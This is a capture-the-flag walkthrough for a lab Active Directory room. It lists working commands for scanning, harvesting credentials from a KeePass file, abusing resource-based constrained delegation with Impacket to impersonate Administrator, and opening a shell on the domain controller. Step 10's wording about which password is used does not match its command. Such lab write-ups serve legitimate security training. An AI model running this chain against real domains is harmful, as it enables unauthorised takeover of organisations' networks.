# [Forward](https://tryhackme.com/room/forwardchallenge)

## Now is the time to move forward in this AD challenge.

[ INITIAL ACCESS GRANTED ]

USER > ctf.local\j.smith
PASS > JSmith@IT2024

You're already in. The breach has been assumed, now it's time to move forward. Navigate through a compromised Active Directory environment, move laterally through the domain, and escalate your way to full control. The question isn't how you got in... it's how far you can go.

### What's the Administrator flag?

1. Start with a full TCP port scan to map every open service on the target before diving deeper.

```bash
nmap -p- <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49667/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49697/tcp open  unknown
49804/tcp open  unknown
```

2. Run a detailed service and version detection scan against every discovered port to enumerate the software stack and gather AD-specific metadata.

```bash
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,9389,49667,49670,49671,49672,49697,49804 -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-08 20:01:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.ctf.local
| Not valid before: 2026-05-19T02:27:27
|_Not valid after:  2026-11-18T02:27:27
| rdp-ntlm-info:
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-06-08T20:01:57+00:00
|_ssl-date: 2026-06-08T20:02:37+00:00; -1s from scanner time.
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49804/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

3. Add the target's IP address alongside both the short domain name and the fully-qualified DC hostname to `/etc/hosts`. This is necessary for Kerberos authentication. Kerberos requires proper name resolution and will reject tickets requested against a raw IP.

```bash
echo "<TARGET_IP> ctf.local DC01.ctf.local" >> /etc/hosts
```

4. Enumerate available SMB shares with the provided credentials to identify any non-default file shares that may contain sensitive data.

```bash
smbclient -L //<TARGET_IP> -U j.smith%JSmith@IT2024
```

**Results:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
Downloads       Disk      File drop share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

5. Run the BloodHound Python ingestor to collect all AD objects, ACLs, group memberships, sessions, and trust relationships from the domain. The output ZIP file can then be uploaded to BloodHound CE for visual attack path analysis.

```bash
bloodhound-ce-python -u 'j.smith' -p 'JSmith@IT2024' -d ctf.local -dc DC01.ctf.local -ns <TARGET_IP> -c All --zip
```

6. Open an RDP session as `j.smith` to begin interactive enumeration directly on the domain controller. The `/cert:ignore` flag suppresses the self-signed certificate warning.

```bash
xfreerdp /v:<TARGET_IP> /u:j.smith /p:'JSmith@IT2024' /cert:ignore
```

7. Inside the RDP session, navigate to `j.smith`'s `Documents` folder. There is a file named `Database.kdbx`. This type of file commonly stores credentials for other accounts in the environment.

8. Open **KeePass 2** from the Start menu. The database contains entries for multiple domain users. Copy the password for `t.jones`.

9. Open a Command Prompt and list the contents of `C:\Users` to confirm that `r.williams` has an active local profile on the machine, verifying they are a real domain user.

10. Back on the attacking machine, use the `addcomputer.py` Impacket script together with `r.williams`'s login and `t.jones` password to create a new computer account in the domain named `ATTACKERSYSTEM$`. We need a computer account because only computer accounts can be the delegation source in an RBCD attack.

```bash
python3 addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'P@ssword1234' -dc-host <TARGET_IP> -domain-netbios CTF ctf.local/r.williams:Helpdesk01!
```

11. Use the `rbcd.py` Impacket script to write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on `DC01$`, granting our newly created `ATTACKERSYSTEM$` account the right to impersonate any domain user when requesting a service ticket for resources on `DC01$`. This is possible because `r.williams` has **GenericWrite** over `DC01$` as discovered in BloodHound.

```bash
python3 rbcd.py -dc-ip <TARGET_IP> -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:Helpdesk01!'
```

12. Request a Kerberos service ticket for the `cifs/DC01.ctf.local` service while impersonating the `Administrator` account. The `getST.py` Impacket script leverages the S4U2Self and S4U2Proxy Kerberos extensions: S4U2Self obtains a service ticket for `ATTACKERSYSTEM$` on behalf of `Administrator`, and S4U2Proxy uses that ticket to request a forwardable service ticket for CIFS on `DC01`. The result is a `.ccache` credential cache file that can be used directly for authentication.

```bash
getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKERSYSTEM$:P@ssword1234'
```

13. Export the path to the generated Kerberos credential cache file into the `KRB5CCNAME` environment variable. Impacket tools and other Kerberos-aware utilities read this variable to locate the cached ticket and use it automatically instead of prompting for a password.

```bash
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

14. Use `smbexec.py` from Impacket with Kerberos authentication to obtain an interactive shell on the domain controller as `Administrator`. The `-no-pass` flag instructs the tool to rely entirely on the Kerberos ticket loaded from the cache file rather than performing any password-based authentication.

```bash
smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

15. With a shell running in the context of `Administrator` on `DC01`, navigate to the Administrator's Desktop and read the flag.

```bash
dir C:\Users\Administrator\Desktop
type C:\Users\Administrator\Desktop\flag.txt
```

[SCREEN01]
